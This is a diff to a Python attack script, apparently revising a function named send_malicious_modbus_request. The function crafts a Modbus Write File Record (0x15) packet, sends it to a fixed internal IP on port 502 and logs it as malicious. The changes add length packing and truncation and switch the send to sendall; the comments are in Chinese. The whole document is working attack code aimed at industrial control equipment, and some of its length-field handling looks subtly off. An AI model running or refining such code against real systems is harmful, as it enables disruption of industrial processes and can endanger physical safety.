@@ -1,4 +1,5 @@
 import socket
+import struct
 import logging
 
 logging.basicConfig(level=logging.DEBUG)
@@ -18,19 +19,32 @@ def send_malicious_modbus_request():
         file_record_header.extend(file_number.to_bytes(2, 'big'))
         file_record_header.extend(record_number.to_bytes(2, 'big'))
         file_record_header.extend(record_length.to_bytes(2, 'big'))
+
+        # 注意：如果 record_data 超過 65535 字節，應進行適當處理
+        if len(record_data) > 65535:
+            record_data = record_data[:65535]  # 限制為最大範圍
+
         file_record = file_record_header + record_data
 
         # 構建 Modbus PDU
         modbus_pdu_header = bytearray()
         modbus_pdu_header.extend((0x15).to_bytes(1, 'big'))  # 功能碼 0x15
-        modbus_pdu_header.extend(len(file_record).to_bytes(2, 'big'))  # PDU 長度
+        pdu_length = len(file_record)  # 長度計算
+        if pdu_length > 65535:
+            logging.warning('PDU length exceeds maximum value; truncating to 65535')
+            pdu_length = 65535
+        modbus_pdu_header.extend(struct.pack('!H', pdu_length))  # PDU 長度
         modbus_pdu = modbus_pdu_header + file_record
 
         # 構建 Modbus ADU
         modbus_adu_header = bytearray()
         modbus_adu_header.extend((1).to_bytes(2, 'big'))  # Transaction ID
         modbus_adu_header.extend((0).to_bytes(2, 'big'))  # Protocol ID
-        modbus_adu_header.extend(len(modbus_pdu) + 1)  # Length (PDU 長度 + 1 字節的 Unit ID)
+        adu_length = len(modbus_pdu)  # 長度計算
+        if adu_length > 65535:
+            logging.warning('ADU length exceeds maximum value; truncating to 65535')
+            adu_length = 65535
+        modbus_adu_header.extend(struct.pack('!H', adu_length))  # Length (PDU 長度)
         modbus_adu_header.extend((1).to_bytes(1, 'big'))  # Unit ID
         modbus_request = modbus_adu_header + modbus_pdu
 
@@ -39,7 +53,7 @@ def send_malicious_modbus_request():
             s.connect(('10.103.152.8', 502))
             logging.info("Connected to server.")
 
-            s.send(modbus_request)
+            s.sendall(modbus_request)  # 使用 sendall 確保所有數據被發送
             logging.debug('Sent malicious Modbus request: %s', repr(modbus_request))
 
             response = s.recv(1024)
